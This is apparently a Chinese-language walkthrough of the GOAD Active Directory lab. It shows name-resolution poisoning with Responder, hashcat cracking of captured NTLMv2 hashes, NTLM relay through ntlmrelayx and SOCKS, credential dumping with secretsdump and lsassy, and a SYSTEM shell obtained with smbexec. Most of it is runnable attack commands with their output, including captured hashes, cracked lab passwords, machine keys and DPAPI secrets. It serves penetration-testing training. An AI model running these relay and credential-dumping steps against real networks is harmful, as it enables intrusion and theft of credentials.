# GOAD 投毒和中继

## Responder

可以使用[Responder](https://github.com/lgandx/Responder)获得如下信息:

* 用户名
* netntlmv1哈希(如果服务器很旧)/netntlmv2哈希
* 重定向身份验证的能力(NTLM 中继)
* .....

在实验室中，有两个bots来模拟 LLMRN、MDNS 和 NBT-NS 请求，一名用户的密码较弱，但没有管理员权限，另一个用户拥有管理员权限，但使用强密码

启动Responder

```bash
sudo responder -I eth1
```

```bash
[*] [NBT-NS] Poisoned answer sent to 192.168.56.11 for name MEREN (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[SMB] NTLMv2-SSP Client   : fe80::95bf:b9ba:b521:19b9
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:902277346de724b8:73E92F21794E831AC88EA7EB72488719:01010000000000000083AE7601B2D9017B71C0D28CE1089E0000000002000800580045004200360001001E00570049004E002D003600320056005700450045005100450059004200550004003400570049004E002D00360032005600570045004500510045005900420055002E0058004500420036002E004C004F00430041004C000300140058004500420036002E004C004F00430041004C000500140058004500420036002E004C004F00430041004C00070008000083AE7601B2D901060004000200000008003000300000000000000000000000003000000A49D6368B08D1DC46EF5B3229E5336013E07F16707B08028CB7288A71959D880A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] Skipping previously captured hash for NORTH\eddard.stark
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Meren
[*] Skipping previously captured hash for NORTH\eddard.stark
[*] [NBT-NS] Poisoned answer sent to 192.168.56.11 for name BRAVOS (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Bravos
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::95bf:b9ba:b521:19b9 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[SMB] NTLMv2-SSP Client   : fe80::95bf:b9ba:b521:19b9
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:f8ca94abf87f34dd:6630B0A3FF693B689B40402EA0EEF3B1:01010000000000000083AE7601B2D901FEB19EA948E074840000000002000800580045004200360001001E00570049004E002D003600320056005700450045005100450059004200550004003400570049004E002D00360032005600570045004500510045005900420055002E0058004500420036002E004C004F00430041004C000300140058004500420036002E004C004F00430041004C000500140058004500420036002E004C004F00430041004C00070008000083AE7601B2D901060004000200000008003000300000000000000000000000003000000A49D6368B08D1DC46EF5B3229E5336013E07F16707B08028CB7288A71959D880A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000

```

```bash
hashcat -m 5600 --force -a 0 responder.hashes rockyou.txt
```

```bash
ROBB.STARK::NORTH:f8ca94abf87f34dd:6630b0a3ff693b689b40402ea0eef3b1:01010000000000000083ae7601b2d901feb19ea948e074840000000002000800580045004200360001001e00570049004e002d003600320056005700450045005100450059004200550004003400570049004e002d00360032005600570045004500510045005900420055002e0058004500420036002e004c004f00430041004c000300140058004500420036002e004c004f00430041004c000500140058004500420036002e004c004f00430041004c00070008000083ae7601b2d901060004000200000008003000300000000000000000000000003000000a49d6368b08d1dc46ef5b3229e5336013e07f16707b08028cb7288a71959d880a001000000000000000000000000000000000000900160063006900660073002f0042007200610076006f0073000000000000000000:sexywolfy
```

得到了另一个账户密码 robb.stark:sexywolfy

这足以攻占NORTH.SEVENKINGDOMS.LOCAL，因为robb.stark是NORTH.SEVENKINGDOMS.LOCAL的ADMINISTRATORS组成员

![BloodHound1](<images/BloodHound1.png>)

Eddard的密码比较强，用这个方法是破解不了的
这并不意味着我们无能为力，我们可以做的是将 eddard 连接中继到unsigned smb 服务器

> Responder 将日志保存在 /opt/tools/Responder/logs（在 exegol 上），如果您需要再次显示它们

> 如果要删除以前捕获的日志（消息跳过以前捕获的哈希）删除文件 /opt/tools/Responder/Responder.db

目前获取的凭据：

* north.sevenkingdoms.local\samwell.tarly:Heartsbane（用户描述）

* north.sevenkingdoms.local\brandon.stark:iseedeadpeople（AS-REP Roasting）

* north.sevenkingdoms.local\hodor:hodor（密码喷洒）

* north.sevenkingdoms.local\jon.snow:iknownothing（Kerberoasting）

* north.sevenkingdoms.local\robb.stark:sexywolfy （Responder）

## NTLM Relay

首先找到signing:False的服务器

```bash
crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
```

接下来尝试将ntlm认证中继到这些服务器

### responder + ntlmrelayx to smb

在启动responder对 LLMNR、MDNS 和 NBT-NS 请求的回复投毒之前，我们必须停止 responder监听smb 和 http 服务器，因为我们不想直接获取哈希值，但我们想将它们中继到 ntlmrelayx

```bash
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
```

```bash
HTTP = Off
```

```bash
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
```

```bash
SMB = Off
```

启动ntlmrelayx

```bash
sudo impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
```

启动

* -tf：要中继身份验证的目标列表

* -of：输出文件，这将保留捕获的SMB哈希，就像我们之前使用响应器所做的那样，以便以后破解它们

* -smb2support：支持 SMB2

* -socks：将启动袜子代理以使用中继身份验证

```bash
ntlmrelayx> socks
Protocol  Target         Username            AdminStatus  Port 
--------  -------------  ------------------  -----------  ----
SMB       192.168.56.22  NORTH/EDDARD.STARK  TRUE         445  
SMB       192.168.56.22  NORTH/ROBB.STARK    FALSE        445  
SMB       192.168.56.23  NORTH/EDDARD.STARK  FALSE        445  
SMB       192.168.56.23  NORTH/ROBB.STARK    FALSE        445  
```

* 投毒中继到了castelblack (192.168.56.22) 和 essos (192.168.56.23)，并设置了一个 socks 代理来使用该连接

* 由于 eddard.stark 是 north.sevenkingdoms.local 的域管理员，他在 castelback (192.168.56.22) 上获得了管理员权限

![BloodHound2](images/BloodHound2.png)

从图中很明显eddard.stark对MSSQL Server CASTELBLACK具有管理员权限

因为域树内建立了互相信任，所以全局组成员NORTH/EDDARD.STARK和NORTH/ROBB.STARK才可以访问essos.local中的MSSQL Server BRAAVOS 的资源

### Secretsdump

使用secretsdump获取SAM数据库、LSA缓存登录、机器帐户和一些DPAPI信息

```bash
proxychains secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

```bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb669e202a0f8b9c8606ffb2e2ae043b1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0e181c6215bdbfd5b93917da349fc7cd:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[*] Dumping cached domain logon information (domain/username:hash)
NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a
NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405
NORTH.SEVENKINGDOMS.LOCAL/jon.snow:$DCC2$10240#jon.snow#82fdcc982f02b389a002732efaca9dc5
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NORTH\CASTELBLACK$:aes256-cts-hmac-sha1-96:cb8fae3b3100fd97fef810af27d870a5107b6b63c6234e74c216abccf6a00a19
NORTH\CASTELBLACK$:aes128-cts-hmac-sha1-96:7d4a746188838cbbdde5cb46e8c7d670
NORTH\CASTELBLACK$:des-cbc-md5:a207f2a2dfbf20ad
NORTH\CASTELBLACK$:plain_password_hex:720076004f0037002100340032004b005b006a0039003f002300740056006c005b00710022007800200077006f0046004800640026005e0066005400360052005a0036004e00380064003e002c004e006a005f003e0062002900680055005d0067003d004d00430024004d003c00590020005e00200059007000320021006a0032005600710036003b00790048004a00540045003c005a0022004200730023005e003e00700035006b005e003b003d005c0062003d003600440074006400650071006c00750059003900430039006200390053006a006500280077002b00550074004e006200210060004d004c003c00
NORTH\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:31bd66f0c6d14cc04235bc432af5c856:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x895960368af379200eca79f34713b458b878021d
dpapi_userkey:0x2d7e212a58f8898088f49bba3bc5daa7b5ad4699
[*] NL$KM 
 0000   39 FB 46 D8 43 B6 EC E6  DE D7 CE 1C 50 2D AE B4   9.F.C.......P-..
 0010   4F 71 E1 25 BF 5E FB 14  86 14 D6 A3 0F 93 DE 42   Oq.%.^.........B
 0020   06 48 F4 35 B1 45 83 7E  1A 98 29 D6 45 19 14 D2   .H.5.E.~..).E...
 0030   C4 66 57 03 2B C5 04 01  AE 33 49 CD D2 E0 92 CE   .fW.+....3I.....
NL$KM:39fb46d843b6ece6ded7ce1c502daeb44f71e125bf5efb148614d6a30f93de420648f435b145837e1a9829d6451914d2c46657032bc50401ae3349cdd2e092ce
[*] _SC_MSSQL$SQLEXPRESS 
north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

* sam 数据库包含本地帐户（忽略 vagrant，因为它是设置实验室的默认用户）
* 获得了本地管理员用户的 NTLM Hash
* 获得了最后连接用户的 LSA 缓存（默认情况下 Windows 保留最后 10 个用户），即使域控制器无法访问，这对于连接到服务器也很有用，但这些缓存的凭证可以用 hashcat 离线破解（非常慢）
* 最后，我们还获得了机器帐户的哈希值（如果获取了机器帐户NTML Hash，就相当于拥有一个域用户的权限）

>使用机器帐户，您可以像任何其他域用户一样查询 LDAP，运行 Bloodhound Ingestor

### Lsassy

* 使用 lsassy 获取 lsass 进程存储的凭据

* 域帐户信息存储在 LSASS 进程中，因此转储此进程可以为您提供更多的域帐户和权限
* Lsassy 允许您远程转储 lsass（比执行 procdump、下载 lsass 转储文件并在本地执行 pypykatz 或 mimikatz 更方便），它会为您执行所有痛苦的操作，如转储和读取 lsass 内容（它也只转储 lsass 转储的有用部分优化传输时间）（lsassy 也作为一个 cme 模块存在）

```bash
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```

```bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[+] 192.168.56.22 Authentication successful
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[+] 192.168.56.22 Lsass dumped in C:\Windows\Temp\V2O.log (50526003 Bytes)
[+] 192.168.56.22 Lsass dump deleted
[+] 192.168.56.22 NORTH\CASTELBLACK$                      [NT] 31bd66f0c6d14cc04235bc432af5c856 | [SHA1] c3b83d288de925a4d6e8a19e461dabce7de98511
[+] 192.168.56.22 north.sevenkingdoms.local\CASTELBLACK$  [PWD] rvO7!42K[j9?#tVl[q"x woFHd&^fT6RZ6N8d>,Nj_>b)hU]g=MC$M<Y ^ Yp2!j2Vq6;yHJTE<Z"Bs#^>p5k^;=\b=6DtdeqluY9C9b9Sje(w+UtNb!`ML<
[+] 192.168.56.22 NORTH\robb.stark                        [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c
[+] 192.168.56.22 NORTH\sql_svc                           [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:14 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_83599b66.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:14 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_c1d426ae.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\robb.stark    [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:17 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_b7a23061.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\robb.stark    [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:17 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_6ef5c1c6.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\sql_svc       [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:14 (TGT_NORTH.SEVENKINGDOMS.LOCAL_sql_svc_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_3a6215d8.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:14 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_812ca443.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2023-08-03 11:14 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_e1566d0a.kirbi)
[+] 192.168.56.22 18 Kerberos tickets written to /home/kali/.config/lsassy/tickets
[+] 192.168.56.22 5 masterkeys saved to /home/kali/.config/lsassy/masterkeys.txt
```

### DonPapi

* 它用于获取 dpapi 和其他密码存储的信息（文件、浏览器、计划任务等）
* 该工具不接触 LSASS，因此它更加隐蔽，并且即使在目标上启用了 av 和 edr，也能在大多数时间工作。

```
proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

> 笔者测试工具有bug，暂时跳过

### Smbclient

使用 smbclient 直接连接到 smbserver

```bash
proxychains impacket-smbclient -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```

```bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
Type help for list of commands
# shares
ADMIN$
all
C$
IPC$
public
# use C$
# ls
drw-rw-rw-          0  Tue Jul  4 20:18:24 2023 $Recycle.Bin
drw-rw-rw-          0  Thu Jul  6 04:57:39 2023 Config.Msi
-rw-rw-rw-       1220  Wed Jul  5 23:24:10 2023 dns_log.txt
drw-rw-rw-          0  Fri Jul 17 10:28:38 2020 Documents and Settings
drw-rw-rw-          0  Thu Jul  6 04:48:54 2023 inetpub
-rw-rw-rw-  738197504  Thu Aug  3 04:14:31 2023 pagefile.sys
drw-rw-rw-          0  Wed Jul  5 18:50:24 2023 PerfLogs
drw-rw-rw-          0  Thu Jul  6 04:56:49 2023 Program Files
drw-rw-rw-          0  Thu Jul  6 04:56:08 2023 Program Files (x86)
drw-rw-rw-          0  Thu Jul  6 06:31:42 2023 ProgramData
drw-rw-rw-          0  Tue Jul  4 20:18:03 2023 Recovery
drw-rw-rw-          0  Thu Jul  6 04:51:23 2023 setup
drw-rw-rw-          0  Thu Jul  6 05:00:47 2023 shares
drw-rw-rw-          0  Fri Jul 17 10:27:55 2020 System Volume Information
drw-rw-rw-          0  Wed Jul  5 23:11:00 2023 tmp
drw-rw-rw-          0  Tue Aug  1 02:49:18 2023 Users
drw-rw-rw-          0  Wed Aug  2 05:24:26 2023 Windows
```

代码执行使用 smbexec 或 atexec

```bash
proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```

```bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:192.168.56.22[\pipe\svcctl]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[+] Executing %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami /all
[+] Executing %COMSPEC% /Q /c echo whoami /all ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

C:\Windows\system32>
```

>对于socks连接，只能使用smbexec 或atexec，wmiexec、psexec 和 dcomexec 都不起作用（此处说明： <https://github.com/SecureAuthCorp/impacket/issues/412）>

## Mitm6 + ntlmrelayx to ldap

>由于MS16-077导致LLMNR/NBNS投毒指定WPAD文件方法失效，所以另一种有用方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器进行WPAD欺骗

>Windows 优先使用 IPv6 而不是 IPv4，因此我们可以捕获并毒害对 DHCPv6 查询的响应，使用**MITM6**更改 DNS 服务器并将查询重定向到我们的计算机

>在实际的IPv6网络中，客户端的IPv6是由主机本身分配的，不需要DHCP服务器

* 启动mitm6来毒害DHCPv6并从主机获取dns请求
* 顺便说一句，我注意到我们可以毒害域控制器，但之后 DC 并不关心，仍然使用他们的本地主机 DNS 服务器。
* 所以我们必须瞄准服务器

* 在这个例子中，我们将毒害 braavos 服务器。我们将回答 wpad 查询并将 http 查询转发到 meereen 上的 ldaps，以添加具有代理访问权限的计算机。

〜首先，我们需要对 braavos.local 网络配置进行一些小更改〜（编辑：如果您在 08/18/2022 之后进行了 ansible 配置，则不再需要）
在 rdp 上使用 khal.drogo:horse 连接到 braavos，并将以太网的 dns 服务器更改为自动（我将很快在 ansible 实验室手册中修复该问题，但现在您必须手动执行此操作）。仅将第一个以太网连接更改为自动 dns。
